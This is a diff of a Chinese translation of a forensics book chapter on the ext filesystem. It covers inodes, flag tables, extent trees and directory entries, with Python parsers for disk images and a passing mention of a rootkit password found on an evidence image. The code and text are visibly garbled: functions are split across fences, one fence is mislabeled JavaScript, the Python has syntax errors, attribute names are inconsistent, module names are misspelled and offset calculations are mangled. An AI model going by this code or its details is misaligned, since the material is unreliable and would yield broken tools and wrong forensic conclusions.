-Inode 类按顺序存储扩展信息，并提供了一个格式化输出的辅助函数。构造函数接受数据和大小（默认为 128 字节）。对于大于 128 字节的 inode，第一个字是额外信息的大小。用法：`inode = Inode(data, size)`。
+### `Inode` 类
 
+`Inode` 类按顺序存储扩展信息，并提供了一个格式化输出的辅助函数。构造函数接受数据和大小（默认为 128 字节）。对于大于 128 字节的 inode，第一个字是额外信息的大小。用法：`inode = Inode(data, size)`。
+
+```python
 class Inode():
     def __init__(self, data, size=128):
         # 存储模式位向量及其解释
@@ -5676,65 +6764,107 @@ class Inode():
         # 删除时间
         self.deleteTime = getU32(data)
         # 组 ID
-        self.groupID = getU16(data)
-        # 链接数
-        self.links = getU16(data)
-        # 块
-        self.blocks = getU32(data)
-        # 标志位向量
-        self.flags = getU32(data)
-        # 标志列表
-        self.flagList = getInodeFlags(self.flags)
-        # 操作系统
-        self.os = getU32(data)
-        # 生成号
-        self.generation = getU32(data)
-
-        # 扩展属性（如果 inode 大于128 字节）
-        if size > 128:
-            self.extendAttribs = []
-            self.inodeSize = 128 + getU16(data)
-            # 这里的逻辑是根据实际情况从数据中填充扩展属性
-            for i in range(15):
-                self.extendAttribs.append(getU32(data, 0x28 + i * 4))
-        else:
-            self.inodeSize = size
-            self.extendAttribs = []
-
-    def prettyPrint(self):
-        for k, v in sorted(self.__dict__.items()):
-            print(k+":", v)
 ```
 
 
 
 ```python
+self.groupID = getU16(data)
+```
+
+# 链接数
+
+```python
+self.links = getU16(data)
+```
+
+# 块
+
+```python
+self.blocks = getU32(data)
+```
+
+# 标志位向量
+
+```python
+self.flags = getU32(data)
+```
+
+# 标志列表
+
+```python
+self.flagList = getInodeFlags(self.flags)
+```
+
+# 操作系统
+
+```python
+self.os = getU32(data)
+```
+
+# 生成号
+
+```python
+self.generation = getU32(data)
+```
+
+# 扩展属性（如果 inode 大于128 字节）
+
+```python
+if size > 128:
+    self.extendAttribs = []
+    self.inodeSize = 128 + getU16(data)
+    # 这里的逻辑是根据实际情况从数据中填充扩展属性
+    for i in range(15):
+        self.extendAttribs.append(getU32(data, 0x28 + i * 4))
+else:
+    self.inodeSize = size
+    self.extendAttribs = []
+```
+
+```python
+def prettyPrint(self):
+    for k, v in sorted(self.__dict__.items()):
+        print(k+":", v)
+```
+
+```python
 emd = extfs.ExtMetadata(sys.argv[1], sys.argv[2])
+
 # get inode location
 inodeLoc = extfs.getInodeLoc(sys.argv[3],)
+
 emd.superblock.inodesPerGroup
+
 offset = emd.bgdList[inodeLoc[0]].inodeTable + \
 * emd.superblock.block.inodeSize
+
 inodeLoc[1] * emd.superblock.inodeSize
+
 with open(str(sys.argv[1]), 'rb') as f:
     f.seek(offset + int(sys.argv[2]) * 512)
     data = str(f.read(emd.superblock.inodeSize))
+
 inode = extfs.getInode(data, "%s in Block Group %s at index %s") % (str(sys.argv[3]), \
 str(inodeLoc[0]), str(inodeLoc[1]))
+
 inode.prettyPrint()
+
 if __name__ == "__main__":
     main()
 ```
 
-在这个脚本中，我们通过 `import extfs` 这一行导入了 `extfs.py` 文件。注意导入语句中没有文件扩展名。脚本逻辑非常直接：如果传递给脚本的参数不足，会调用典型的用法函数。它创建一个扩展元数据对象，然后计算所涉及 inode 的位置。一旦确定了位置，就会从文件中检索 inode 数据并创建一个打印到屏幕上的 inode 对象。注意，由于我们现在正在调用当前文件之外的代码，必须在函数名面前加上“extfs.”。我们可以通过将导入语句更改为 `from extfs import *` 来避免这一点，但我没有这样做，因为我觉得带有“extfs.”前缀会让代码更清晰。
 
-针对来自 PFE 学科系统镜像中某一个有趣的 inode 运行此新脚本的结果如图 7.21 所示。关于这个 inode 有几点需要注意：首先，标志位（flags）表明该 inode 使用了某种含义，即块数组具有不同的解释（将在本章稍晚部分进行更详细介绍）。其次，该 inode 包含一个创建时间。由于这是 ext4 文件系统中才有的一个新字段，许多工具（包括修改时间戳的工具）都不会更改此字段。这个未被更改的时间戳对于法取证调查员来说是极佳的数据。现在我们已经学习了通用的 inode，准备开始讨论如果文件系统启用某些功能时将会出现的某些 inode 扩展。
+
+在这个脚本中，我们通过 `import extfs` 这一行导入了 `extfs.py` 文件。注意导入语句中没有文件扩展名。脚本逻辑非常直接：如果传递给脚本的参数不足，会调用典型的用法函数。它创建一个扩展元数据对象，然后计算所涉及 `inode` 的位置。一旦确定了位置，就会从文件中检索 `inode` 数据并创建一个打印到屏幕上的 `inode` 对象。注意，由于我们现在正在调用当前文件之外的代码，必须在函数名面前加上 `extfs.`。我们可以通过将导入语句更改为 `from extfs import *` 来避免这一点，但我没有这样做，因为我觉得带有 `extfs.` 前缀会让代码更清晰。
+
+针对来自 PFE 学科系统镜像中某一个有趣的 `inode` 运行此新脚本的结果如图 7.21 所示。关于这个 `inode` 有几点需要注意：首先，标志位 `flags` 表明该 `inode` 使用了某种含义，即块数组具有不同的解释（将在本章稍晚部分进行更详细介绍）。其次，该 `inode` 包含一个创建时间。由于这是 `ext4` 文件系统中才有的一个新字段，许多工具（包括修改时间戳的工具）都不会更改此字段。这个未被更改的时间戳对于法取证调查员来说是极佳的数据。现在我们已经学习了通用的 `inode`，准备开始讨论如果文件系统启用某些功能时将会出现的某些 `inode` 扩展。
 
 ## Inode 扩展与细节
 
-你可能已经注意到上一节中的脚本，inode 中的文件模式位向量（bitvector）包含的不仅仅文件模式。除了可以通过 `chmod` 命令更改的标准模式信息外，还存储了文件类型。文件模式位向量总结在表 7.8。
+你可能已经注意到上一节中的脚本，`inode` 中的文件模式位向量 `bitvector` 包含的不仅仅文件模式。除了可以通过 `chmod` 命令更改的标准模式信息外，还存储了文件类型。文件模式位向量总结在表 7.8。
 
-表 7.8. 源自 inode 的文件模式位向量。**加粗**的项目是互斥的。
+### 表 7.8. 源自 inode 的文件模式位向量。**加粗**的项目是互斥的。
 
 | 15 | 14 | 13 | 12 | 11 | 10 | 9 | 8 |
 |---|---|---|---|---|---|---|---|
@@ -5744,7 +6874,7 @@ if __name__ == "__main__":
 
 检查表 7.8 时，低 12 位应该看起来熟悉，因为所有这些模式都可以通过标准的 Linux `chmod`（更改模式）命令进行更改。这些文件模式并不是互斥的。高 4 位用于指定文件类型。每个文件只允许一种类型。文件类型详细列在表 7.9 中。
 
-## 表 7.9. 从 inode 文件模式的高四位解码文件类型。
+### 表 7.9. 从 inode 文件模式的高四位解码文件类型。
 
 | | | 源自 inode 文件模式的位 |
 |---|---|---| 15 | 14 | 13 | 12 |
@@ -5756,7 +6886,7 @@ if __name__ == "__main__":
 | 符号链接 | 1 | 0 | 1 | 0 |
 | 套接字 | 1 | 1 | 0 | 0 |
 
-inode 包含一个 32 位的标志位向量。低字（word）标志总结在表 7.10 中。某些标志可能缺乏操作系统的支持。熟悉 Windows 的调查员可能知道注册表标志 `HKLM\SYSTEM\CurrentSet\Control\FileSystem\NtfsDisableLastAccessUpdate`，它可以禁用 NTFS 目录上的访问时间更新。在位 7 中，不更新访问时间在扩展文件系统中提供了类似的功能，但它是作用于单个文件或目录层级的。
+`inode` 包含一个 32 位的标志位向量。低字 `word` 标志总结在表 7.10 中。某些标志可能缺乏操作系统的支持。熟悉 Windows 的调查员可能知道注册表标志 `HKLM\SYSTEM\CurrentSet\Control\FileSystem\NtfsDisableLastAccessUpdate`，它可以禁用 NTFS 目录上的访问时间更新。在位 7 中，不更新访问时间在扩展文件系统中提供了类似的功能，但它是作用于单个文件或目录层级的。
 
 ### 表 7.10. inode 标志的低字。
 
@@ -5766,7 +6896,7 @@ inode 包含一个 32 位的标志位向量。低字（word）标志总结在表
 | 7 | 6 | 5 | 4 | 3 | 2 | 1 | 0 |
 | 不更新访问时间 | 备份 (Dump) | 仅追加 (Append) | 同步写入 | 文件已压缩 | 留留删除 | 安全删除 |
 
-标志的高字（high word）总结在表 7.11 中。这些标志大部分仅在 ext4 的背景下有意义。在位 28，inode 具有内联数据，用于将小文件完全存储在 inode 中。前 60 字节存储在块数组中（这不需要存储块）。如果文件增长超过 60 字节到 160 字节。如果文件超过 160 字节，所有数据将移动到块。
+标志的高字 `high word` 总结在表 7.11 中。这些标志大部分仅在 `ext4` 的背景下有意义。在位 28，`inode` 具有内联数据，用于将小文件完全存储在 `inode` 中。前 60 字节存储在块数组中（这不需要存储块）。如果文件增长超过 60 字节到 160 字节。如果文件超过 160 字节，所有数据将移动到块。
 
 ### 表 7.11. inode 标志的高字。
 
@@ -5776,25 +6906,25 @@ inode 包含一个 32 位的标志位向量。低字（word）标志总结在表
 | 23 | 22 | 21 | 20 | 19 | 18 | 17 | 16 |
 | 未用 | 文件末后的块（已弃） | inode 存储大属性 | 未用 | inode 使用扩展 (extents) | 目录顶部 | 同步写入 |
 
-大文件以簇指定大小而不是块。当存在大文件时，簇大小存储在超级块中。大文件需要扩展。扩展将在本文稍后讨论。在内联数据中，扩展对这些 60 字节有不同的用途。我们说过 inode 是元数据的守护者。在下一节中，我们将讨论根据 inode 中存储的信息检索文件。
+大文件以簇指定大小而不是块。当存在大文件时，簇大小存储在超级块中。大文件需要扩展。扩展将在本文稍后讨论。在内联数据中，扩展对这些 60 字节有不同的用途。我们说过 `inode` 是元数据的守护者。在下一节中，我们将讨论根据 `inode` 中存储的信息检索文件。
 
 ## 从 inode 到文件
 
-我们已经讨论了块数组中的条目以及它们如何用于指定文件的块。我们也看到这些 60 字节可能被重用。如果 inode 存储的是符号链接且目标小于 60 字节，它将存储在块数组中。如果设置了内联数据，前 60 字节位于空间中。我们也提到扩展使用这些 60 字节的方式不同。
+我们已经讨论了块数组中的条目以及它们如何用于指定文件的块。我们也看到这些 60 字节可能被重用。如果 `inode` 存储的是符号链接且目标小于 60 字节，它将存储在块数组中。如果设置了内联数据，前 60 字节位于空间中。我们也提到扩展使用这些 60 字节的方式不同。
 
-在解析文件（或目录）的块列表 inode 时，在最通的情况下（即没有扩展），我们读取块数组中的前两个条目并将任何非零值添加到我们的列表中。如果第 13 个条目非零，我们读取包含 1024 个块列表的块。任何非零条目都添加到列表中。这允许处理大小为 4 MB + 48 KB 的文件。
+在解析文件（或目录）的块列表 `inode` 时，在最通的情况下（即没有扩展），我们读取块数组中的前两个条目并将任何非零值添加到我们的列表中。如果第 13 个条目非零，我们读取包含 1024 个块列表的块。任何非零条目都添加到列表中。这允许处理大小为 4 MB + 48 KB 的文件。
 
-如果块数组中有第 14 个条目，我们加载包含块列表的块，将其转换为块列表。这种双级间接允许有 1024 * 1024 个条目，至少指向 4 GB + 4 MB + 48 KB。如果仍然不够，最后一个条目用于三级间接，理论上允许文件达到 4 TB + 4 GB + 4 MB。如果你使用的是 ext4 文件系统，更有可能使用下一节讨论的扩展。
+如果块数组中有第 14 个条目，我们加载包含块列表的块，将其转换为块列表。这种双级间接允许有 1024 * 1024 个条目，至少指向 4 GB + 4 MB + 48 KB。如果仍然不够，最后一个条目用于三级间接，理论上允许文件达到 4 TB + 4 GB + 4 MB。如果你使用的是 `ext4` 文件系统，更有可能使用下一节讨论的扩展。
 
-### 扩展 (Extents)
+### 扩展 Extents
 
 上一节描述的存储块列表系统在大多数文件都很小时很好。然而，当文件大小以 MB、GB 或 TB 为单位时，性能迅速成为问题。公平地说，Linux 扩展文件系统存在了几十年，对许多用户来说仍然是可以接受的。改进大性能的优雅解决方案是使用扩展。
 
 扩展以树结构存储块。熟悉 NTFS 的人会知道它以类似的方式使用数据运行（连续簇）列表。与 Linux 中的大多数事物一样，在树中存储块比 Windows 使用的简单列表高效得多。构建扩展树需要三种结构。扩展树的顶节点必须有一个头部，指示节点中存储的内容。树的顶节点通常被称为根节点。根节点始终存储在索引数组的开头。所有非空扩展树都至少有一个被称为扩展的叶节点（本质上等同于 NTFS 数据运行）。根节点和叶节点之间可能存在中间节点，称为索引。所有三种结构的长度均为 12 字节，允许将根节点加上四个条目存储在索引数组中。
 
-扩展头部总结在表 7.12 中。头部以一个魔数开始，用于双重检查后续内容不是传统的块条目。如果深度为 0，此节点头部后的条目是叶节点（扩展）。否则，条目用于索引（中间）节点。如果你进行计算，存储 ext4 支持的最大文件在树中永远不需要超过五层。
+扩展头部总结在表 7.12 中。头部以一个魔数开始，用于双重检查后续内容不是传统的块条目。如果深度为 0，此节点头部后的条目是叶节点（扩展）。否则，条目用于索引（中间）节点。如果你进行计算，存储 `ext4` 支持的最大文件在树中永远不需要超过五层。
 
-## 7.12. 扩展头部格式。
+### 7.12. 扩展头部格式。
 
 | 偏移量 | 大小 | 名称 | 描述 |
 |---|---|---|---|
@@ -5804,13 +6934,9 @@ inode 包含一个 32 位的标志位向量。低字（word）标志总结在表
 | 0x6 | 2 | Depth | 0=此节点指向数据块；1-5=此节点指向其他扩展 |
 | 0x8 | 4 | Generation | 树的代数 |
 
-扩展 inode 条目总结在表 7.13 中。第一个字段中的块是逻辑块号（文件包含从逻辑块零到总块数减一的块）。对于熟悉 NTFS 的人，这类似于虚拟簇号 (VCN)。索引节点中唯一的真实数据是树中低一层节点的 48 位块地址。
+扩展 `inode` 条目总结在表 7.13 中。第一个字段中的块是逻辑块号（文件包含从逻辑块零到总块数减一的块）。对于熟悉 NTFS 的人，这类似于虚拟簇号 `VCN`。索引节点中唯一的真实数据是树中低一层节点的 48 位块地址。
 
-
-
-
-
-## 表 7.13. 范围索引格式。
+### 表 7.13. 范围索引格式。
 
 | 偏移量 | 大小 | 名称 | 描述 |
 | --- | --- | --- | --- |
@@ -5819,9 +6945,9 @@ inode 包含一个 32 位的标志位向量。低字（word）标志总结在表
 | 0x8 | 2 | Leaf hi | 上述块的高 16 位 |
 | 0xA | | Unused | 填充至 12 字节大小 |
 
-范围（叶子）（leaf）节点在表 7.14 中进行了总结。与索引节点一样，第一个字段是逻辑块号。后面紧跟一个长度。该长度通常小于 32,768。然而，如果该文件系统支持未初始化的块（带有懒性块组功能），则大于 32,768 的值表示该范围由 (32,768 – 长度) 个未初始的数据块组成。这并不常见。范围以该范围内第一个块的 48 位数据块地址结束。
+范围（叶子）`leaf` 节点在表 7.14 中进行了总结。与索引节点一样，第一个字段是逻辑块号。后面紧跟一个长度。该长度通常小于 32,768。然而，如果该文件系统支持未初始化的块（带有懒性块组功能），则大于 32,768 的值表示该范围由 `(32,768 – 长度)` 个未初始的数据块组成。这并不常见。范围以该范围内第一个块的 48 位数据块地址结束。
 
-## 表 7.14. 范围节点格式。
+### 表 7.14. 范围节点格式。
 
 | 偏移量 | 大小 | 名称 | 描述 |
 | --- | --- | --- | --- |
@@ -5830,65 +6956,66 @@ inode 包含一个 32 位的标志位向量。低字（word）标志总结在表
 | 0x6 | 2 | Start hi | 起始块的高 16 位 |
 | 0x8 | 4 | Start lo | 起始块的低 32 位 |
 
-```
-Class ExtentHeader. 解析 12 字节的范围头部，该头部存在于 Linux ext4 文件系统设置了范围标志位（extent flag）的 inode 的每个范围节点中。接受一个 12 字节的紧凑字符串。
-```
 
-用法: eh = ExtentHeader(data)
-eh.prettyPrint()
+
+### Class `ExtentHeader`
+解析 12 字节的范围头部，该头部存在于 Linux ext4 文件系统设置了范围标志位（extent flag）的 inode 的每个范围节点中。接受一个 12 字节的紧凑字符串。
+
+用法: `eh = ExtentHeader(data)`  
+`eh.prettyPrint()`
 
 ```python
-"""
 class ExtentHeader():
- def __init__(self, data):
-    self.magic = getU16(data)
-    self.entries = getU16(data, 0x2)
-    self.max = getU16(data, 0x4)
-    self.depth = getU16(data, 0x6)
-    self.generation = getU32(data, 0x8)
-  def prettyPrint(self):
-    print("Extent depth: %s entries: %s max-entries: %s generation: %s" \
-    % (self.depth, self.entries, self.max, self.generation)
-"""
+    def __init__(self, data):
+        self.magic = getU16(data)
+        self.entries = getU16(data, 0x2)
+        self.max = getU16(data, 0x4)
+        self.depth = getU16(data, 0x6)
+        self.generation = getU32(data, 0x8)
+
+    def prettyPrint(self):
+        print("Extent depth: %s entries: %s max-entries: %s generation: %s" \
+        % (self.depth, self.entries, self.max, self.generation))
 ```
 
-Class ExtentIndex. 代表范围树中的中间或索引节点。接受一个包含索引的 12 字节紧凑字符串。
-用法: ei = ExtentIndex(data)
-ei.prettyPrint()
+### Class `ExtentIndex`
+代表范围树中的中间或索引节点。接受一个包含索引的 12 字节紧凑字符串。
+用法: `ei = ExtentIndex(data)`  
+`ei.prettyPrint()`
 
 ```python
-"""
 class ExtentIndex():
- def __init__(self, data):
-    self.block = getU32(data)
-    self.leaflo = getU32(data, 0x4)
-    self.leafhi = getU16(data, 0x8)
-  def prettyPrint(self):
-    print("Index block: %s leaf: %s" \
-    % (self.block, self.leafHi * pow(2, 32) + self.leafLo))
-"""
+    def __init__(self, data):
+        self.block = getU32(data)
+        self.leaflo = getU32(data, 0x4)
+        self.leafhi = getU16(data, 0x8)
+
+    def prettyPrint(self):
+        print("Index block: %s leaf: %s" \
+        % (self.block, self.leafHi * pow(2, 32) + self.leafLo))
 ```
 
-Class Extent. 代表范围树中的叶子节点或范围。接受一个包含范围的 12 字节紧凑字符串。
-用法: ext = Extent(data)
-extent.prettyPrint()
+### Class `Extent`
+代表范围树中的叶子节点或范围。接受一个包含范围的 12 字节紧凑字符串。
+用法: `ext = Extent(data)`  
+`extent.prettyPrint()`
 
 ```python
-"""
 class Extent():
- def __init__(self, data):
-    self.block = getU32(data)
-    self.len = getU16(data, 0x4)
-    self.startHi = getU16(data, 0x6)
-    self.startLo = get32(data, 0x8)
-  def prettyPrint(self):
-    print("Extent block: %s data blocks: %s - %s"
-          %(self.block, self.startHi * pow(2, 32) + self.startLo, \
-          self.len + self.startHi * pow(2, 32) + self.startLo - 1))
-"""
+    def __init__(self, data):
+        self.block = getU32(data)
+        self.len = getU16(data, 0x4)
+        self.startHi = getU16(data, 0x6)
+        self.startLo = get32(data, 0x8)
+
+    def prettyPrint(self):
+        print("Extent block: %s data blocks: %s - %s"
+              %(self.block, self.startHi * pow(2, 32) + self.startLo, \
+              self.len + self.startHi * pow(2, 32) + self.startLo - 1))
 ```
 
-Function getTree(data). 此函数将从传入的数据中获取范围树。
+### Function `getTree(data)`
+此函数将从传入的数据中获取范围树。
 
 注意 1：仅解析传递给函数的数据。如果节点是索引节点，则不会遍历树。
 
@@ -5910,12 +7037,11 @@ def getTree(data):
     return retVal
 ```
 
-此代码使用了书中尚未涵盖的技术。我们必须修改 inode 类以正确处理范围。Inode 类。该类以有序的方式存储 inode 信息，并提供一个格式化的辅助函数。它接受一个包含 inode 数据的紧凑字符串，大小是定义的。对于大于 128 字节的 inode，更新后的 inode 类如下所示。
-用法: inode = Inode(data)
-inode.prettyPrint()
+此代码使用了书中尚未涵盖的技术。我们必须修改 inode 类以正确处理范围。`Inode` 类。该类以有序的方式存储 inode 信息，并提供一个格式化的辅助函数。它接受一个包含 inode 数据的紧凑字符串，大小是定义的。对于大于 128 字节的 inode，更新后的 inode 类如下所示。
+用法: `inode = Inode(data)`  
+`inode.prettyPrint()`
 
 ```python
-"""
 class Inode():
     def __init__(self, data, inodeSize=128):
         # 存储原始位向量
@@ -5969,38 +7095,44 @@ class Inode():
             # 扩展时间
             attributes += time.get32(data, 0x7c)
 
-  def prettyPrint(self):
-        for k, v in sorted(self.__dict__.items()):
-            if k == 'extents' and self.extents:
-                v[0].prettyPrint() # 头部
-                for i in range(1, v[0].entries + 1):
-                    v[i].prettyPrint()
-            elif k == 'changeTime' or k == 'modifyTime' or \
-                    k == 'accessTime' or \
-                 k == 'createTime':
-                print k+":", time.astctime(v)
-            elif k == 'deleteTime':
-                if calendar.timegm(v) == 0:
-                    print 'Deleted': no
-                else:
-                    print k+":", time.astctime(v)
-            else:
-                print k+":", v
-"""
+    def prettyPrint(self):
 ```
 
 
 
+```python
+for k, v in sorted(self.__dict__.items()):
+    if k == 'extents' and self.extents:
+        v[0].prettyPrint() # 头部
+        for i in range(1, v[0].entries + 1):
+            v[i].prettyPrint()
+    elif k == 'changeTime' or k == 'modifyTime' or \
+         k == 'accessTime' or \
+         k == 'createTime':
+        print k+":", time.astctime(v)
+    elif k == 'deleteTime':
+        if calendar.timegm(v) == 0:
+            print 'Deleted': no
+        else:
+            print k+":", time.astctime(v)
+    else:
+        print k+":", v
+```
+
 ```javascript
 function getBlock() {
+```
 此函数将返回一个数据块列表。
-如果正在使用范围区（extents），假设树只有单层，那么这应该是简单的。
-对于具有多个层级的范围区和间接块，
-还需要额外的“磁盘访问”。
-用法：bl = getBlockList(inode, imageFilename, offset, blockSize)
-其中 inode 是对象，imageFilename 是原始镜像文件的文件名，
-offset 是文件系统起始处的 512 字节偏移量，而 blockSize（默认值为 4096）是数据块的大小。
 
+如果正在使用范围区（`extents`），假设树只有单层，那么这应该是简单的。
+
+对于具有多个层级的范围区和间接块，还需要额外的“磁盘访问”。
+
+用法：`bl = getBlockList(inode, imageFilename, offset, blockSize)`
+
+其中 `inode` 是对象，`imageFilename` 是原始镜像文件的文件名，`offset` 是文件系统起始处的 512 字节偏移量，而 `blockSize`（默认值为 4096）是数据块的大小。
+
+```python
 def getBlockList(inode, imageFilename, offset, blockSize=4096):
   # 现在获取数据块并输出它们
   datablocks = []
@@ -6083,6 +7215,8 @@ def getBlockList(inode, imageFilename, offset, blockSize=4096):
 return datablocks
 ```
 
+
+
 第一个辅助函数 `getBlock` 仅仅是定位到文件镜像中的正确位置并读取一个数据块。第二个函数 `getList` 则要复杂一些。它首先检查是否存在范围区（extents）。如果使用了范围区，则文件在 inode 块数组的四个条目中仅包含叶子节点。我们快速检查树的深度是否为 0，如果是这种情况，则直接从 inode 块数组中读取条目。我们这样做不仅是为了简化大多数情况下的代码，也是因为生成数据块不需要额外的访问。
 
 如果我们拥有一个多层树，我们会保存当前层的 inode，并创建一个空的叶子节点列表。然后，我们在 `while currentLevel[0].depth != 0:` 这一行开始一个 `while` 循环。该循环将一直执行，直到找到树的最低层（叶子节点）为止。在遍历树的过程中，遇到的任何叶子节点都会添加到 `leafNode` 中。
@@ -6128,6 +7262,7 @@ def f(x):
 
 ### 为 PentesterAcademy 开发
 ### Phil Polstra 博士 (@ppolstra)
+
 import extfs
 import sys
 import os.path
@@ -6169,21 +7304,19 @@ if __name__ == "__main__":
     main()
 ```
 
-针对 rootkit 关联 inode 运行 icat 的结果如图 7.23 所示。脚本的输出已管道到 xxd，以便正确显示此程序中的十六进制值。截图显示了多个嵌入字符串，其中包含错误信息，甚至还有反转密码“sw0rdm4n”。
 
 
-
-
+针对 `rootkit` 关联 `inode` 运行 `icat` 的结果如图 7.23 所示。脚本的输出已管道到 `xxd`，以便正确显示此程序中的十六进制值。截图显示了多个嵌入字符串，其中包含错误信息，甚至还有反转密码“`sw0rdm4n`”。
 
 # 图 7.23
 
-`icat.py` 针对 PFE 目标系统中与 rootkit 关联的 inode 的部分结果。输出已通过 `xxd` 处理。请注意，截图中可以看到几条错误信息和远程登录密码。
+`icat.py` 针对 PFE 目标系统中与 `rootkit` 关联的 `inode` 的部分结果。输出已通过 `xxd` 处理。请注意，截图中可以看到几条错误信息和远程登录密码。
 
-### 目录条目
+## 目录条目
 
-我们已经了解到 inode 包含了文件的所有元数据。它们还包含了文件数据块的位置。关于文件，唯一未知的就是它的名称。inode 和文件名之间的这种连接是在目录中建立的。不出意外，在 Linux 这种万物皆文件的操作系统中，目录是存储在文件中的。在本章早些对 inode 的讨论中，我们提到 inode 2 用于存储根目录。
+我们已经了解到 `inode` 包含了文件的所有元数据。它们还包含了文件数据块的位置。关于文件，唯一未知的就是它的名称。`inode` 和文件名之间的这种连接是在目录中建立的。不出意外，在 Linux 这种万物皆文件的操作系统中，目录是存储在文件中的。在本章早些对 `inode` 的讨论中，我们提到 `inode 2` 用于存储根目录。
 
-经典的目录条目由一个 4 字节的 inode 号、后续一个 2 字节的记录长度、然后是 2 字节的名称长度，最后是长度最多 255 个字符的名称。如表 7.15所示所示。名称长度是两个字节，但最大名称长度只能用一个字节存储。这最初可能是为了字节对齐的考虑。
+经典的目录条目由一个 4 字节的 `inode` 号、后续一个 2 字节的记录长度、然后是 2 字节的名称长度，最后是长度最多 255 个字符的名称。如表 7.15 所示。名称长度是两个字节，但最大名称长度只能用一个字节存储。这最初可能是为了字节对齐的考虑。
 
 ### 表 7.15 经典的目录条目结构。
 
@@ -6194,7 +7327,7 @@ if __name__ == "__main__":
 | 0x6 | 2 | Name len | 名称长度 |
 | 0x8 | | | 名称字符串（最多 255 个字符） |
 
-在意识到高位字节未被使用后，创建了一项（不兼容的）文件系统特性“文件类型（File Type）”，以重新利用该字节来存储类型信息。为什么这会出现在不兼容特性列表中是显而易见的，因为如果将其解释为名称长度的一部分，会导致所有文件名看起来像垃圾数据。这种优化提高了任何仅对特定类型文件有意义的操作的效率，因为它消除了通过读取大量 inode 来确定文件类型的需要。具有 File Type 特性的系统的目录条目结构如表 7.16 所示。
+在意识到高位字节未被使用后，创建了一项（不兼容的）文件系统特性“文件类型（File Type）”，以重新利用该字节来存储类型信息。为什么这会出现在不兼容特性列表中是显而易见的，因为如果将其解释为名称长度的一部分，会导致所有文件名看起来像垃圾数据。这种优化提高了任何仅对特定类型文件有意义的操作的效率，因为它消除了通过读取大量 `inode` 来确定文件类型的需要。具有 File Type 特性的系统的目录条目结构如表 7.16 所示。
 
 ### 表 7.16 启用 File Type 特性时的目录条目结构。
 
@@ -6206,7 +7339,7 @@ if __name__ == "__main__":
 | 0x7 | 1 | File type | 0x00 未知 0x01 普通 0x02 目录 0x03 字符设备 0x04 块设备 0x05 FIFO 0x06 Socket 0x07 符号链接 |
 | 0x8 | | Name | 名称字符串（最多 255 个字符） |
 
-原始原始目录没有校验和，也没有完整性检查工具。为了在不破坏现有系统的情况下添加此功能，开发了一种特殊的目录条目类型，称为“目录尾（directory tail）”。目录尾的 inode 值为 0，这是无效的。旧系统看到这一点并假设已到达目录末尾（尾）。记录长度被正确设置为 12。目录尾的结构如表 7.17 所示。
+原始原始目录没有校验和，也没有完整性检查工具。为了在不破坏现有系统的情况下添加此功能，开发了一种特殊的目录条目类型，称为“目录尾（directory tail）”。目录尾的 `inode` 值为 0，这是无效的。旧系统看到这一点并假设已到达目录末尾（尾）。记录长度被正确设置为 12。目录尾的结构如表 7.17 所示。
 
 ### 表 7.17 目录尾结构。
 
@@ -6218,9 +7351,9 @@ if __name__ == "__main__":
 | 0x7 | | File type | 设置为 0xDE |
 | 0x8 | 4 | Checksum | 目录叶块 CRC32 校验和 |
 
-本节目前介绍的线性目录只要目录不增长得太大就是没问题的的。当目录变得很大时，实现哈希目录（hash directories）可以提高性能。与校验和一样，哈希条目存储在目录块末尾之后，以欺骗旧系统忽略它们。请记住，inode 中有一个 `ext4_index` 标志，它会提醒兼容系统哈希条目的的存在。
+本节目前介绍的线性目录只要目录不增长得太大就是没问题的的。当目录变得很大时，实现哈希目录（hash directories）可以提高性能。与校验和一样，哈希条目存储在目录块末尾之后，以欺骗旧系统忽略它们。请记住，`inode` 中有一个 `ext4_index` 标志，它会提醒兼容系统哈希条目的的存在。
 
-目录节点存储在哈希平衡树中，通常缩短为 htree。我们在在本章早些对范围区（extents）的讨论中已经见过树。熟悉 NTFS 的人知道，NTFS 文件系统上的目录存储在树中。在 NTFS 的情况下，节点根据其文件名命名。在扩展文件系统的 htree 中，节点根据其哈希值命名。由于哈希值只有四个字节长，会发生冲突。因此，一旦根据文件名哈希字符串比较定位了条目，如果字符串不匹配，则检查下一个条目（它应该具有相同的哈希），直到找到匹配项为止。
+目录节点存储在哈希平衡树中，通常缩短为 `htree`。我们在在本章早些对范围区（extents）的讨论中已经见过树。熟悉 NTFS 的人知道，NTFS 文件系统上的目录存储在树中。在 NTFS 的情况下，节点根据其文件名命名。在扩展文件系统的 `htree` 中，节点根据其哈希值命名。由于哈希值只有四个字节长，会发生冲突。因此，一旦根据文件名哈希字符串比较定位了条目，如果字符串不匹配，则检查下一个条目（它应该具有相同的哈希），直到找到匹配项为止。
 
 根哈希目录块以该目录和父目录的传统“.”和“...”目录条目开始。在这两个条目（均为 12 字节长）之后，是一个 16 字节的头头部，随后是 8 字节的条目，直到块的结束。根哈希目录块的结构如表 7.18 所示。
 
@@ -6238,18 +7371,17 @@ if __name__ == "__main__":
 | 0x24 | 2 | Count | 计数 |
 | 0x28 | 4 | Hash | 哈希值 |
 
-
-
-
-
+```
 break
 
 return retVal
+```
 
-上面的代码中没有新技术。我们也可以创建一个新脚本 `ils.py`，它将根据索引节点（inode）而不是目录名来创建目录列表。该新脚本的代码如下。你可能会注意到此脚本与 `icat` 非常相似，主要区别在于数据被解释为目录，而不是写入标准输出。
+上面的代码中没有新技术。我们也可以创建一个新脚本 `ils.py`，它将根据索引节点（`inode`）而不是目录名来创建目录列表。该新脚本的代码如下。你可能会注意到此脚本与 `icat` 非常相似，主要区别在于数据被解释为目录，而不是写入标准输出。
 
 ```python
 #!/usr/bin/python
+
 #
 ### ils.py
 #
@@ -6259,6 +7391,7 @@ return retVal
 #
 ### 为 PentesterAcademy 开发
 # 作者：Phil Polstra 博士 (@ppolstra)
+
 import extffs
 import sys
 import os.path
@@ -6266,10 +7399,12 @@ import subprocess
 import struct
 import time
 from math import log
+
 def usage():
     print("usage " + sys.argv[0] + " <image file> <offset> <inode number> \n"
           "Displays directory for an inode from an image file")
     exit(1)
+
 def main():
     if len(sys.argv) < 3:
         usage()
@@ -6277,13 +7412,16 @@ def main():
     if not os.path.isfile(sys.argv[1]):
         print("File " + sys.argv[1] + " cannot be opened for reading")
         exit(1)
+
     emd = extffs.ExtMetadata(sys.argv[1], sys.argv[2])
     # 获取 inode 位置
     inodeLoc = extffs.getInodeLoc(sys.argv[3], \
         emd.superblock.inodesPerGroup)
+
     offset = emd.bgdList[inodeLoc[0]].inodeTable \
 * emd.superblock.blockSize + \
 inodeLoc[1] * emd.superblock.inode
+
 with open(sys.argv[1], 'rb') as f:
     f.seek(offset + int(sys.argv[2]) * 512)
